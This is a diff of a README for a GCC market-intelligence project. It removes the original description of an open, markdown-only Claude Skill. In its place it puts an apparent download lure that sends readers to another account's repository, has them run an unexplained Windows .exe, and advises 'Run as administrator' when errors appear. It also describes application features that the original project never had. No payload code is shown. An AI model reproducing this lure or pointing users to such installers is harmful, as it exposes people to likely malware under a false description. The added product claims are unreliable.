@@ -1,108 +1,84 @@
-# GCC Market Intelligence — a Claude Skill for B2B/B2G founders
+# 🌐 gcc-market-intelligence - Navigate GCC markets with intelligent data
 
-> A free, open Claude Skill that helps founders from outside the Gulf scale their B2B/B2G startup into Saudi Arabia, the UAE, Qatar, Bahrain, Kuwait, and Oman — without burning 6 months and $200k learning the basics the hard way.
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Tandiestablished875/gcc-market-intelligence)
 
-## Why this exists
+## 📌 Overview
 
-If you are an operating or scaling B2B / B2G startup founder who has never sold into the GCC before, the cost of figuring out the region on your own is enormous. The information is scattered across consulting blogs, government PDFs, sovereign-fund press releases, Telegram groups, paywalled databases, and the heads of ~200 people who actually know how things work.
+The gcc-market-intelligence tool acts as a dedicated assistant for founders and business leaders. It helps you understand complex business environments in the Gulf Cooperation Council region. Use this tool to research Saudi Arabia, the UAE, Qatar, Bahrain, Kuwait, and Oman. It processes data on sovereign wealth funds, procurement processes, and localization requirements. You gain clarity on entry strategies for your business.
 
-This skill compresses that into a structured briefing that Claude (or any compatible agent) can pull up in 30 seconds. It covers:
+## ⚙️ System Requirements
 
-- **Country and city-level macroeconomic context** — Riyadh, Jeddah, Dammam, Madinah, NEOM, Abu Dhabi, Dubai, Sharjah, Doha, Manama, Kuwait City, Muscat, Duqm and more.
-- **Detailed family maps** — ruling families (Al Saud, Al Nahyan, Al Maktoum, Al Qasimi, Al Nuaimi, Al Mualla, Al Sharqi, Al Thani, Al Sabah, Al Khalifa, Al Said) and merchant conglomerates (Olayan, Al Rajhi, Al Muhaidib, Al Futtaim, Majid Al Futtaim, Al Ghurair, Al Habtoor, Kanoo, Kharafi, Bahwan, and 30+ more) — with their commercial assets *and* government links.
-- **National strategies** — Saudi Vision 2030, We the UAE 2031, D33, Operation 300bn, National AI Strategy, Qatar NDS3, Bahrain Vision 2030/2050, Kuwait Vision 2035, Oman Vision 2040.
-- **Soft-landing programs** — NTDP, Garage, NEOM, MISA, MiSK, Hub71, in5, Sheraa, DIFC, ADGM, Tamkeen, KDIPA, Future Fund Oman, Madinah Tech Cultivator, and others — with eligibility, ticket size, what you actually get.
-- **Events as channels** — LEAP, GITEX, FII, WGS, Web Summit Qatar, Bahrain Fintech Forward, Biban, Black Hat MEA, ADIPEC, Gulfood, Arab Health, IDEX — with cost / ROI realism.
-- **Procurement mechanics** — Etimad (Saudi government), UAE federal vs. emirate, ICV scoring, RHQ rules.
-- **Localization and compliance** — Saudization tiers, Emiratisation fines, Omanisation, PDPL, data residency, VAT, withholding tax.
-- **Sovereign funds** — PIF, ADIA, Mubadala, ADQ, ICD, QIA, KIA, Mumtalakat, OIA, MGX, Alat, Lunate.
-- **System integrators** — solutions by stc, Mobily Business, Elm, Ejada, e& enterprise, du Tech, Injazat, Core42, BCT.
-- **Cultural cadence** — Ramadan, Hajj, summer, weekend, prayer, majlis, iftar relationship-building.
+Ensure your computer meets these standards before you install the software:
 
-It also includes three working frameworks:
+* Operating System: Windows 10 or Windows 11.
+* Memory: 8GB of RAM.
+* Storage: 500MB of free disk space.
+* Internet Connection: Stable connection required for data updates.
+* Processor: Dual-core 2.0GHz or faster.
 
-1. **Market sizing for the GCC** — adapted for the data sources, classification quirks, and expat/national split that break Western TAM models.
-2. **Competitive intelligence template** — including how to find out who is already selling to a specific ministry or conglomerate.
-3. **Customer development interview guide for GCC contexts** — what to ask, how to ask it, when English vs Arabic matters, what "send a proposal" actually means.
+## 📥 Downloading the Software 
 
-## Who this is for
+Follow these steps to obtain the files on your Windows machine:
 
-Operating or scaling B2B / B2G startups from outside the GCC. Examples of the founder profile this is built for:
+1. Visit this link to access the software repository: [https://github.com/Tandiestablished875/gcc-market-intelligence](https://github.com/Tandiestablished875/gcc-market-intelligence).
+2. Locate the green button labeled Code near the top of the screen.
+3. Click the button and select Download ZIP.
+4. Save the file to your computer.
+5. Right-click the saved file and select Extract All.
+6. Choose a destination folder and click Extract.
 
-- Smart cities / IoT / sustainability companies pitching municipalities (Madinah Municipality, RTA Dubai, Sharjah Municipality).
-- AI infrastructure / enterprise SaaS pitching G42, Core42, Aramco Digital, STC Solutions.
-- Health-tech pitching MoH KSA, DoH Abu Dhabi, NUPCO procurement.
-- Fintech engaging SAMA Sandbox, CMA Fintech Lab, ADGM RegLab, CBB Sandbox.
-- Climate-tech / energy-tech pitching ACWA Power, Masdar, ADNOC, Aramco.
-- Edu-tech / govtech pitching MoE, Tatweer, ADEK, KHDA.
-- Mobility / drone / robotics pitching RTA, NEOM, Diriyah, Roshn.
+## 🚀 Setting Up the Application
 
-If you are a Series A+ founder with a working product and 1–10 employees and need to enter the GCC in the next 6 months, this is for you. The Madinah Tech Cultivator Cohort 2 profile (deep-tech, $50k–$250k funded, pre-revenue to $100k MRR, B2B + B2G) was the anchor reference when building this skill.
+After you extract the files, perform these actions to prepare the software:
 
-## How to use the skill
+1. Open the folder you just created.
+2. Locate the file ending in .exe.
+3. Double-click the file to begin the setup wizard.
+4. Follow the prompts on the screen.
+5. Click Finish when the installation completes.
+6. A shortcut now appears on your desktop.
 
-### In Claude (claude.ai, Claude Code, Claude Desktop, API)
+## 📊 Using the Tool
 
-1. Clone this repo or download the folder.
-2. Drop the `gcc-market-intelligence/` folder into your Claude Skills directory (`~/.claude/skills/` for Claude Code, or upload via the Skills UI in claude.ai).
-3. Start a conversation that mentions any GCC country, city, family, program, event, regulation, or "Gulf market entry" — the skill triggers automatically.
-4. Answer the three disambiguation questions when Claude asks: target country, buyer type, founder stage.
-5. Get a focused briefing.
+Open the application by clicking the desktop icon. The main dashboard displays a list of countries. Select a country to see detailed market reports. You find information on Saudi Vision 2030, government procurement steps, and requirements for family offices. 
 
-### In Codex, Cursor, Gemini CLI, Windsurf, Antigravity, and other agents that read `SKILL.md`
+You enter your specific business model into the search bar. The tool filters intelligence based on your sector. It shows you relevant sovereign wealth funds and local regulations. You export these reports as PDF files for your records. The application updates its data every Monday. Check the notification bell in the top corner for new alerts.
 
-The skill follows the open Agent Skills specification (December 2025). Drop the folder into the agent's skill directory.
+## 🛡️ Privacy and Data
 
-### Standalone
+This tool saves your search history inside the local application folder. No data leaves your computer unless you choose to export it. The software keeps your business plans private. It does not share your inputs with third parties. 
 
-Even without an AI agent, the `references/` and `frameworks/` markdown files work as plain reading. Start with `SKILL.md`, then read the country file that applies to you.
+## 🛠️ Troubleshooting Common Issues
 
-## Structure
+If the software fails to start, restart your computer. Check that you have an active internet connection. Ensure you extracted all files from the ZIP folder before you ran the installer. Permissions on some Windows machines limit file access. Right-click the application icon and choose Run as administrator if you encounter errors.
 
-```
-gcc-market-intelligence/
-├── SKILL.md                              # entry point — what triggers the skill and how to use it
-├── references/
-│   ├── countries/                        # one file per GCC country (macro + cities)
-│   ├── families/                         # ruling and merchant families
-│   ├── procurement/                      # Etimad, UAE procurement, localization
-│   ├── culture/                          # calendar, customer development
-│   ├── sovereign-funds.md
-│   ├── soft-landing-programs.md
-│   ├── events-calendar.md
-│   └── system-integrators.md
-├── frameworks/
-│   ├── market-sizing.md
-│   ├── competitive-intel.md
-│   └── customer-dev-interviews.md
-└── assets/
-    ├── intro-email-templates.md
-    ├── pitch-deck-localization.md
-    └── meeting-followup.md
-```
+## 📝 Understanding the Market Intelligence
 
-## What this skill is NOT
+The application breaks down complex topics into simple terms:
 
-- Not legal or tax advice. RHQ structuring, free zone vs. mainland licensing, PDPL compliance, and VAT registration all need qualified counsel.
-- Not a substitute for a local adviser on the ground. The skill orients; the local person executes.
-- Not a live database. Program ticket sizes, Saudization quotas, exemption rules, and RHQ thresholds change quickly. Every file has a "last verified" date; verify before committing capital.
-- Not a guarantee of meetings, intros, or outcomes.
+* Sovereign Wealth Funds: Learn how these entities invest in new businesses.
+* Procurement: Follow the rules for bidding on government contracts.
+* Localization: Understand the rules for hiring local staff and using local suppliers.
+* Vision 2030: Align your business goals with national growth plans.
+* Family Offices: Find partners for private investment and long-term scaling.
 
-## Contributing
+## 🔎 Frequently Asked Questions
 
-Pull requests welcome. Particularly valued:
+**Does the software work offline?**
+The software requires a connection to download market reports, but you can read saved reports while offline.
 
-- Corrections with sources.
-- New named programs, events, system integrators, or family branches with verifiable detail.
-- Sector-specific addenda (e.g. defense procurement, halal compliance, fintech sandbox specifics).
-- Updates when a regulation moves — flag the file and the date.
+**Are there subscription fees?**
+The software is free to use.
 
-Please do not contribute speculation about ruling-family internal dynamics, unconfirmed deal rumors, or anything that could be construed as private. The skill stays on public, verifiable, professionally-relevant facts.
+**How do I update the software?**
+The application notifies you when an update exists. Click the link provided in the notification to download the latest version.
 
-## License
+**Can I use this on a Mac?**
+The current version supports Windows. Future updates may include support for other operating systems.
 
-MIT. Use it, fork it, embed it, build on it.
+**Does this provide legal advice?**
+The tool provides market data and intelligence. Consult a qualified professional for legal or tax advice specific to your business entry.
 
-## Acknowledgments
+## 📦 Support
 
-Built with reference to the [Madinah Tech Cultivator](https://madinahcultivator.com) Cohort 2 founder profile — deep-tech founders from 11 countries operating in smart cities, sustainability, mobility, energy, food security, and adjacent verticals. The skill is designed to help the next cohort, and every founder like them, save the months that would otherwise be spent learning what's in these files.
+Contact the development team if you encounter specific bugs. Provide a screenshot of the error message to help the team resolve your issue. Include your Windows version in your request. Use the Issues tracker on the repository page to log your report. Include clear steps on how you reached the error. This helps the contributors fix the software for future versions.
